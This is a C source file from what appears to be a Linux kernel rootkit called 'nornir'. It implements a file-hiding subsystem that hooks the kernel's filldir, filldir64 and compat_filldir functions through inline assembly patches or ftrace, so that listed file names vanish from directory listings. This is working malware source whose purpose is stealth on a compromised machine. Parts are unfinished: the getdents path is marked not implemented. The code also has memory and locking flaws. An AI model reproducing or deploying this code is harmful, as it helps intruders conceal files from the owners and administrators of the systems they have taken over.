/**
 * Copyright (c) 2024 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
 */

#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/spinlock.h>
#include "common/logger.h"
#include "fs/hide.h"
#include "libs/hooks.h"
#include "libs/ksym.h"

LIST_HEAD(hidden_file_list);
DEFINE_SPINLOCK(hidden_file_lock);

void nornir_add_new_hidden_file(const char *name)
{
    struct hidden_file *info;
    struct hidden_file *existed;

    existed = nornir_get_hidden_file_info(name, strlen(name));
    if (unlikely(existed)) {
        logger_warn(
            "Try to hide file with name \"%s\", action ignored.\n",
            name
        );
        return ;
    }

    spin_lock(&hidden_file_lock);

    info = kmalloc(sizeof(*info), GFP_KERNEL);
    info->filename = kmalloc(strlen(name) + 1, GFP_KERNEL);
    strcpy(info->filename, name);
    
    list_add(&info->list, &hidden_file_list);

    spin_unlock(&hidden_file_lock);
}

void nornir_remove_hidden_file(const char *name)
{
    struct hidden_file *info;

    info = nornir_get_hidden_file_info(name, strlen(name));
    if (unlikely(!info)) {
        logger_warn(
            "File with name \"%s\" was not hidden, action ignored.\n",
            name
        );
        return ;
    }

    spin_lock(&hidden_file_lock);

    list_del(&info->list);
    kfree(info);

    spin_unlock(&hidden_file_lock);
}

struct hidden_file* nornir_get_hidden_file_info(const char *name, int namelen)
{
    struct hidden_file *info, *ret = NULL;

    spin_lock(&hidden_file_lock);

    list_for_each_entry(info, &hidden_file_list, list) {
        if (!strncmp(info->filename, name, namelen)) {
            ret = info;
            break;
        }
    }

    spin_unlock(&hidden_file_lock);

    return ret;
}

typedef int (*filldir_fn) (struct dir_context*ctx, const char *name, int namlen,
                           loff_t offset, u64 ino, unsigned int d_type);

static filldir_fn orig_filldir, orig_filldir64, orig_compat_filldir;

static int
nornir_exec_orig_filldir(struct dir_context *ctx, const char *name, int namlen,
                         loff_t offset, u64 ino, unsigned int d_type)
{
    if (unlikely(nornir_get_hidden_file_info(name, namlen))) {
        return 0;
    } else {
        return 1;
    }
}

static int
nornir_exec_orig_filldir64(struct dir_context*ctx, const char *name, int namlen,
                           loff_t offset, u64 ino, unsigned int d_type)
{
    if (unlikely(nornir_get_hidden_file_info(name, namlen))) {
        return 0;
    } else {
        return 1;
    }
}

static int
nornir_exec_orig_compat_filldir(struct dir_context*ctx, const char *name,
                                int namlen, loff_t offset, u64 ino,
                                unsigned int d_type)
{
    if (unlikely(nornir_get_hidden_file_info(name, namlen))) {
        return 0;
    } else {
        return 1;
    }
}

static int nornir_filldir_placeholder(void)
{
    return 1;
}

#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_INLINE

static size_t nornir_evil_filldir_asm_wrapper
(size_t arg0, size_t arg1, size_t arg2, size_t arg3, size_t arg4, size_t arg5);

static size_t nornir_evil_filldir64_asm_wrapper
(size_t arg0, size_t arg1, size_t arg2, size_t arg3, size_t arg4, size_t arg5);

static size_t nornir_evil_compat_filldir_asm_wrapper
(size_t arg0, size_t arg1, size_t arg2, size_t arg3, size_t arg4, size_t arg5);

static struct asm_hook_info filldir_asm_info = {
    .exec_orig = (void*) nornir_exec_orig_filldir,
    .hook_before = (void*) nornir_filldir_placeholder,
    .hook_after = NULL,
    .new_dst = nornir_evil_filldir_asm_wrapper,
};

static struct asm_hook_info filldir64_asm_info = {
    .exec_orig = (void*) nornir_exec_orig_filldir64,
    .hook_before = (void*) nornir_filldir_placeholder,
    .hook_after = NULL,
    .new_dst = nornir_evil_filldir64_asm_wrapper,
};

static struct asm_hook_info compat_filldir_asm_info = {
    .exec_orig = (void*) nornir_exec_orig_compat_filldir,
    .hook_before = (void*) nornir_filldir_placeholder,
    .hook_after = NULL,
    .new_dst = nornir_evil_compat_filldir_asm_wrapper,
};

static size_t nornir_evil_filldir_asm_wrapper
(size_t arg0, size_t arg1, size_t arg2, size_t arg3, size_t arg4, size_t arg5)
{
    size_t args[6];

    args[0] = arg0;
    args[1] = arg1;
    args[2] = arg2;
    args[3] = arg3;
    args[4] = arg4;
    args[5] = arg5;

    return nornir_asm_inline_hook_helper(&filldir_asm_info, args);
}

static size_t nornir_evil_filldir64_asm_wrapper
(size_t arg0, size_t arg1, size_t arg2, size_t arg3, size_t arg4, size_t arg5)
{
    size_t args[6];

    args[0] = arg0;
    args[1] = arg1;
    args[2] = arg2;
    args[3] = arg3;
    args[4] = arg4;
    args[5] = arg5;

    return nornir_asm_inline_hook_helper(&filldir64_asm_info, args);
}

static size_t nornir_evil_compat_filldir_asm_wrapper
(size_t arg0, size_t arg1, size_t arg2, size_t arg3, size_t arg4, size_t arg5)
{
    size_t args[6];

    args[0] = arg0;
    args[1] = arg1;
    args[2] = arg2;
    args[3] = arg3;
    args[4] = arg4;
    args[5] = arg5;

    return nornir_asm_inline_hook_helper(&compat_filldir_asm_info, args);
}

static int nornir_install_inline_asm_filldir_hooks(void)
{
    int err;

    filldir_asm_info.orig_func = (void*) orig_filldir;
    err = nornir_install_inline_asm_hook(
        &filldir_asm_info,
        nornir_evil_filldir_asm_wrapper
    );
    if (err) {
        logger_error("Unable to hook symbol \"filldir\".\n");
        goto err_filldir;
    }

    filldir64_asm_info.orig_func = (void*) orig_filldir64;
    err = nornir_install_inline_asm_hook(
        &filldir64_asm_info,
        nornir_evil_filldir64_asm_wrapper
    );
    if (err) {
        logger_error("Unable to hook symbol \"filldir64\".\n");
        goto err_filldir64;
    }

    compat_filldir_asm_info.orig_func = (void*) orig_compat_filldir;
    err = nornir_install_inline_asm_hook(
        &compat_filldir_asm_info,
        nornir_evil_compat_filldir_asm_wrapper
    );
    if (err) {
        logger_error("Unable to hook symbol \"compat_filldir\".\n");
        goto err_compat_filldir;
    }

    return 0;

err_compat_filldir:
    nornir_remove_inline_asm_hook(&filldir64_asm_info);
err_filldir64:
    nornir_remove_inline_asm_hook(&filldir_asm_info);
err_filldir:
    return err;
}

static void nornir_remove_inline_asm_filldir_hooks(void)
{
    nornir_remove_inline_asm_hook(&compat_filldir_asm_info);
    nornir_remove_inline_asm_hook(&filldir64_asm_info);
    nornir_remove_inline_asm_hook(&filldir_asm_info);
}

#endif

#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FTRACE

static void
nornir_evil_filldir_ftrace(unsigned long ip, unsigned long parent_ip,
                           struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
#ifdef CONFIG_X86_64
    if (unlikely(!nornir_exec_orig_filldir(
        (void*) fregs->regs.di, (void*) fregs->regs.si, (int) fregs->regs.dx,
        (loff_t) fregs->regs.cx, (u64) fregs->regs.r8, (unsigned) fregs->regs.r9
    ))) {
        fregs->regs.ip = (size_t) nornir_filldir_placeholder;
    }
#else
    #error "We do not support ftrace hook under current architecture yet"
#endif
}

static void
nornir_evil_filldir64_ftrace(unsigned long ip, unsigned long parent_ip,
                             struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
#ifdef CONFIG_X86_64
    if (unlikely(!nornir_exec_orig_filldir64(
        (void*) fregs->regs.di, (void*) fregs->regs.si, (int) fregs->regs.dx,
        (loff_t) fregs->regs.cx, (u64) fregs->regs.r8, (unsigned) fregs->regs.r9
    ))) {
        fregs->regs.ip = (size_t) nornir_filldir_placeholder;
    }
#else
    #error "We do not support ftrace hook under current architecture yet"
#endif
}

static void
nornir_evil_compat_filldir_ftrace(unsigned long ip, unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct ftrace_regs *fregs)
{
#ifdef CONFIG_X86_64
    if (unlikely(!nornir_exec_orig_compat_filldir(
        (void*) fregs->regs.di, (void*) fregs->regs.si, (int) fregs->regs.dx,
        (loff_t) fregs->regs.cx, (u64) fregs->regs.r8, (unsigned) fregs->regs.r9
    ))) {
        fregs->regs.ip = (size_t) nornir_filldir_placeholder;
    }
#else
    #error "We do not support ftrace hook under current architecture yet"
#endif
}

static int nornir_install_ftrace_filldir_hooks(void)
{
    int err;

    err = nornir_install_ftrace_hook(orig_filldir, nornir_evil_filldir_ftrace);
    if (err) {
        logger_error("Unable to hook symbol \"filldir\".\n");
        goto err_filldir;
    }

    err = nornir_install_ftrace_hook(
        orig_filldir64,
        nornir_evil_filldir64_ftrace
    );
    if (err) {
        logger_error("Unable to hook symbol \"filldir64\".\n");
        goto err_filldir64;
    }

    err = nornir_install_ftrace_hook(
        orig_compat_filldir,
        nornir_evil_compat_filldir_ftrace
    );
    if (err) {
        logger_error("Unable to hook symbol \"compat_filldir\".\n");
        goto err_compat_filldir;
    }

    return 0;

err_compat_filldir:
    nornir_remove_ftrace_hook(orig_filldir64);
err_filldir64:
    nornir_remove_ftrace_hook(orig_filldir);
err_filldir:
    return err;
}

static void nornir_remove_ftrace_filldir_hooks(void)
{
    nornir_remove_ftrace_hook(orig_compat_filldir);
    nornir_remove_ftrace_hook(orig_filldir64);
    nornir_remove_ftrace_hook(orig_filldir);
}

#endif

#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FILLDIR

static int nornir_init_filldir_hooks(void)
{
    if (nornir_ksym_addr_lookup("filldir", (size_t*)&orig_filldir, NULL, NULL)){
        logger_error("Unable to look up symbol \"filldir\".\n");
        return -ECANCELED;
    }

    if (nornir_ksym_addr_lookup(
        "filldir64",
        (size_t*) &orig_filldir64,
        NULL,
        NULL
    )) {
        logger_error("Unable to look up symbol \"filldir64\".\n");
        return -ECANCELED;
    }

    if (nornir_ksym_addr_lookup(
        "compat_filldir",
        (size_t*) &orig_compat_filldir,
        NULL,
        NULL
    )) {
        logger_error("Unable to look up symbol \"compat_filldir\".\n");
        return -ECANCELED;
    }

#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_INLINE
    return nornir_install_inline_asm_filldir_hooks();
#elif defined(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FTRACE)
    #ifndef CONFIG_DYNAMIC_FTRACE
        #error "Current kernel do not enable CONFIG_DYNAMIC_FTRACE"
    #endif
    return nornir_install_ftrace_filldir_hooks();
#else
    #error "No techniques were chosen for hooking filldir functions"
#endif
}

static void nornir_unload_filldir_hooks(void)
{
#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_INLINE
    nornir_remove_inline_asm_filldir_hooks();
#elif defined(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FTRACE)
    #ifndef CONFIG_DYNAMIC_FTRACE
        #error "Current kernel do not enable CONFIG_DYNAMIC_FTRACE"
    #endif
    nornir_remove_ftrace_filldir_hooks();
#else
    #error "No techniques were chosen for hooking filldir functions"
#endif
}

#endif

#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL

static int nornir_init_getdents_hooks(void)
{
#error "NOT IMPLEMENTED YET"
#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_INLINE
#elif defined(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FTRACE)
    #ifndef CONFIG_DYNAMIC_FTRACE
        #error "Current kernel do not enable CONFIG_DYNAMIC_FTRACE"
    #endif
#elif defined(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL_TABLE)
#else
#endif
    return 0;
}

static void nornir_unload_getdents_hooks(void)
{
#error "NOT IMPLEMENTED YET"
}

#endif

int nornir_init_file_hidden_subsystem(void)
{
    int error = 0;

#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS
    #ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FILLDIR
        error =  nornir_init_filldir_hooks();
    #elif CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL
        error = nornir_init_getdents_hooks();
    #endif
#else
    #error "No romem-overwrite techniques were chosen"
#endif

    return error;
}

void nornir_unload_file_hidden_subsystem(void)
{
#ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS
    #ifdef CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FILLDIR
        nornir_unload_filldir_hooks();
    #elif CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL
        nornir_unload_getdents_hooks();
    #endif
#else
    #error "No romem-overwrite techniques were chosen"
#endif
}
